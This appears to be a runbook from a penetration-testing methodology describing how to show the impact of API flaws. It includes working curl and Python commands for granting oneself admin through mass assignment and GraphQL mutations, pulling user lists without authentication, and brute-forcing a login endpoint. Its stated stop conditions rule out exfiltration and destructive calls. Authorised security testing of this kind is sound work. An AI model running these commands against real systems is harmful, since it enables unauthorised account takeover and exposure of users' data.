# API Impact Escalation Runbook

## Purpose
Escalate API findings to demonstrable impact. SAFE commands only — no data exfiltration, no destructive mutations, no resource exhaustion.

## Variables
- `$TARGET_URL` — API base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated session
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/api`

## Impact Categories

### I1 — Privilege Escalation via Mass Assignment
```bash
curl -sk -b "$COOKIE_JAR" -X PATCH "$TARGET_URL/api/user/me" -H "Content-Type: application/json" -d '{"role":"admin","permissions":["admin_access","user_management"]}' -o "$EVIDENCE_DIR/impact-mass-escalated.json"
echo "Impact: Regular user can self-assign admin role via PATCH endpoint without authorization check"
```

### I2 — Full GraphQL Schema Exposure (data leak blueprint)
```bash
python3 -c "
import json
d=json.load(open('$OUTDIR/gql-full-introspection.json'))
schema=d.get('data',{}).get('__schema',{})
types=schema.get('types',[])
for t in types:
    if t.get('name') and 'User' in t.get('name','').lower():
        fields=[f.get('name') for f in t.get('fields',[])]
        print(f'User type fields: {fields}')
" > "$EVIDENCE_DIR/impact-gql-schema-leak.txt"
echo "Impact: Full database schema exposed via GraphQL introspection — attackers know exact data model"
```

### I3 — Unauthenticated API Data Access
```bash
curl -sk "$TARGET_URL/api/users" -o "$EVIDENCE_DIR/impact-unauth-user-list.json"
USER_COUNT=$(python3 -c "import json; print(len(json.load(open('$EVIDENCE_DIR/impact-unauth-user-list.json'))))" 2>/dev/null)
echo "Impact: Unauthenticated access to $USER_COUNT user records" >> "$EVIDENCE_DIR/impact-log.txt"
```

### I4 — Rate Limit Bypass Enabling Attack Amplification
```bash
for i in $(seq 1 100); do
  curl -sk -o /dev/null -w "%{http_code}\n" "$TARGET_URL/api/login" -d "user=admin&pass=attempt$i"
done | sort | uniq -c > "$EVIDENCE_DIR/impact-rate-limit-brute.txt"
echo "Impact: No rate limiting on login allows unlimited brute-force attempts — 100 requests processed"
```

### I5 — API Version Exposure (access deprecated vulnerable endpoints)
```bash
for v in v1 v2 v3; do
  curl -sk -b "$COOKIE_JAR" "$TARGET_URL/api/$v/admin/users" -o "$EVIDENCE_DIR/impact-api-version-$v.json"
  SIZE=$(wc -c < "$EVIDENCE_DIR/impact-api-version-$v.json")
  [ "$SIZE" -gt 100 ] && echo "Impact: API $v endpoint accessible and returning data ($SIZE bytes)" >> "$EVIDENCE_DIR/impact-log.txt"
done
```

### I6 — GraphQL Mutation Abuse (elevate privileges)
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -b "$COOKIE_JAR" -d '{"query":"mutation{updateUserRole(id:\"me\",role:\"admin\"){id role}}"}' -o "$EVIDENCE_DIR/impact-gql-role-escalation.json"
grep -qiE 'admin' "$EVIDENCE_DIR/impact-gql-role-escalation.json" && echo "Impact: GraphQL mutation allows self privilege escalation to admin" >> "$EVIDENCE_DIR/impact-log.txt"
```

## What Impact Looks Like Per Sub-Type

| Sub-Type | Impact Signal | Severity |
|---|---|---|
| Mass Assignment | Self-assigned admin role via PATCH/PUT | Critical |
| GraphQL Introspection | Full schema with user/admin types exposed | High |
| Unauthenticated API | User lists, PII, sensitive data without auth | Critical |
| No Rate Limiting | Unlimited brute-force on login/reset endpoints | High |
| API Version Exposure | Old endpoints with different (weaker) auth still live | Medium |
| GraphQL Mutations | Arbitrary data modification without proper auth | Critical |

## Stop Conditions
- Stop once privilege escalation to admin is demonstrated
- Stop once unauthenticated data access is confirmed
- Do NOT exfiltrate real user data to external systems
- Do NOT make destructive API calls (DELETE, drop tables, etc.)

## Evidence for Report
- JSON response showing admin role after self-assignment
- JSON response showing user data accessed without authentication
- GraphQL schema showing sensitive types and fields
- Rate limit test showing 100+ sequential successful requests

## Next Routing
- Impact demonstrated -> `runbooks/05-evidence-collection.md`
